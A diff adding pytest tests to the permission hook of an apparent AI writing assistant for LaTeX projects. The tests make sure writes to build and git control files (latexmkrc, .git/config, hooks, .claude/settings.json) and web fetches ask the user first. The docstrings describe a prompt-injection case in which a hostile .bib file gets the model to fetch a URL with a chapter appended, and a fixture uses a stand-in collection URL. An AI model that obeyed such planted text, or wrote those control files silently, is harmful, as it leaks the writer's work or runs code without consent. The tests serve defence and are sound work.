@@ -386,3 +386,99 @@ def test_a_malformed_write_reaches_the_card_rather_than_crashing_the_hook(tmp_pa
     fence._ask_user = _refuse
     result = hook(fence, "Write", {"file_path": ["/etc/passwd"]})
     assert decision(result) == "deny"
+
+
+# --- the files inside a project that are not the writing --------------------
+
+
+CONTROL_WRITES = [
+    "latexmkrc",
+    ".latexmkrc",
+    "Makefile",
+    ".envrc",
+    ".git/config",
+    ".git/hooks/pre-commit",
+    ".claude/settings.json",
+    "chapters/latexmkrc",
+]
+
+
+@pytest.mark.parametrize("relative", CONTROL_WRITES)
+def test_writing_a_control_file_inside_the_project_still_asks(tmp_path, relative):
+    """Everything inside the project is the writing, which is what the agent
+    is for -- except the handful of files that are instructions to some other
+    program.  `latexmkrc` is Perl that the next full build runs; `.git/config`
+    names a command that `git status` runs, and this app runs `git status`
+    after every build.  A model that has read a hostile `.bib` file should not
+    be able to write either without the writer seeing a card.
+
+    Asked, not refused: somebody may genuinely want a Makefile, and this app's
+    whole permission story is that the person decides.  What it must not be
+    is silent.
+    """
+    fence = agent(tmp_path)
+    target = fence.root / relative
+    target.parent.mkdir(parents=True, exist_ok=True)
+    fence._ask_user = _refuse
+    assert decision(hook(fence, "Write", {"file_path": str(target)})) == "deny"
+
+
+@pytest.mark.parametrize("relative", [
+    "main.tex", "chapters/two.tex", "refs.bib", "notes.md", "nexttex.toml",
+    "CLAUDE.md", ".gitignore",
+])
+def test_writing_the_writing_is_still_free(tmp_path, relative):
+    """The rule must not put a card in front of the ordinary work."""
+    fence = agent(tmp_path)
+    target = fence.root / relative
+    target.parent.mkdir(parents=True, exist_ok=True)
+    assert decision(hook(fence, "Write", {"file_path": str(target)})) == "allow"
+
+
+def test_auto_mode_does_not_cover_a_control_file(tmp_path):
+    """Auto mode is a convenience for the writing.  It is not consent for the
+    build configuration, for the same reason it was never consent for a write
+    outside the project."""
+    fence = agent(tmp_path)
+    fence.auto = True
+    fence._ask_user = _refuse
+    target = fence.root / "latexmkrc"
+    assert decision(hook(fence, "Write", {"file_path": str(target)})) == "deny"
+
+
+# --- what leaves the machine ------------------------------------------------
+
+
+@pytest.mark.parametrize("tool, tool_input", [
+    ("WebFetch", {"url": "https://example.invalid/collect?d=abc"}),
+    ("WebSearch", {"query": "who is the author of this thesis"}),
+])
+def test_reaching_the_network_asks(tmp_path, tool, tool_input):
+    """These were waved through in every mode, as tools that "change nothing
+    outside the model's own head".  A fetch is an outbound request to a URL
+    the model chose, and the model's context is assembled out of the
+    project's files -- which arrive from a template, a clone, or a
+    collaborator.  A sentence in a .bib file asking for a URL to be fetched
+    with the chapter appended was a page of text that got what it asked for,
+    silently, with no card, in ordinary mode.
+    """
+    fence = agent(tmp_path)
+    fence._ask_user = _refuse
+    assert decision(hook(fence, tool, tool_input)) == "deny"
+
+
+def test_the_network_card_says_what_actually_happens(tmp_path):
+    """A card whose headline is "Use WebFetch" and whose detail is a blob of
+    JSON teaches people to click Allow without reading."""
+    fence = agent(tmp_path)
+    card = fence.describe("WebFetch", {"url": "https://example.invalid/x"})
+    assert "internet" in card["headline"]
+    assert "example.invalid" in card["detail"]
+    assert "leaves this machine" in card["consequence"]
+
+
+def test_always_allow_is_still_the_way_out(tmp_path):
+    """Anyone who wants the web tools free can have them, by the same
+    mechanism every other tool offers."""
+    fence = agent(tmp_path)
+    assert fence._rule_for("WebFetch", {"url": "https://example.invalid/x"})
